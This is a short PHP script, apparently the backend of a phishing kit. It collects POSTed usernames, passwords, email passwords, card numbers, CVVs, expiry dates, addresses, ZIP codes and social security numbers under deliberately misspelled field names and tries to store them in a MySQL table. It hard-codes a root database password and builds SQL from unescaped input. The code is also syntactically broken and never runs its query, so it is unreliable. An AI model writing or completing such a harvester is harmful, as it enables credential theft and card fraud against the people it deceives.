<?php
$uname = $_POST['uname'];
$pword = $_POST['pword'];
$confpword = $_POST['confpword'];
$emaleid = $_POST['emaleid'];
$emalepass = $_POST['emalepass'];
$numba = $_POST['numba'];
$chardname = $_POST['chardname'];
$chardnumb = $_POST['chardnumb'];
$czcpwd = $_POST['czcpwd'];
$expmun = $_POST['expmun'];
$expyeer = $_POST['expyeer'];
$firstna = $_POST['firstna'];
$lastna = $_POST['lastna'];
$addyone = $_POST['addyone'];
$addytwo = $_POST['addytwo'];
$magicfive = $_POST['magicfive'];
$sosh = $_POST['sosh'];

if (!empty($uname)) ||  !empty($pword) || !empty($confpword) || !empty($emaleid) || !empty($emalepass) || !empty($numba) || !empty($chardname) || !empty($chardnumb) || !empty($czcpwd) || !empty($expnum) || !empty($expyeer) {
    $host = "localhost";
    $dbUsername = "root";
    $dbPassword = "Thisismyheavenandsobeginsmynewlife777$";
    $dbname = "philipjo_TittyMoonLight";

    //start the connection with the db
    $conn = new mysqli($host, $dbUsername, $dbPassword, $dbname)
    
    //close the connection if there is in error
    if (mysqli_connect_error()) {
      echo "Didn't connect to DB");
    } else {
      //Insert the data into the table if no error
      $doit = 'INSERT Into Chasing_Nomore' '(uname, pword, confpword, emaleid, emalepass, numba, chardname, chardnumb, czcpwd, expmun, expyeer, firstna, lastna, addyone, addytwo, magicfive, sosh)'VALUES'('$uname', '$pword', '$confpword', '$emaleid', '$emalepass', '$numba', '$chardname', '$chardnumb', '$czcpwd', '$expmun', '$expyeer', '$firstna', '$lastna', '$addyone', '$addytwo', '$magicfive', '$sosh')';

      //close the connection
      $conn->close();
      echo "IT WORKED!!!";
    }
    }
} else {
  echo "ALL FIELDS ARE REQUIRED";
  die();
}
?>
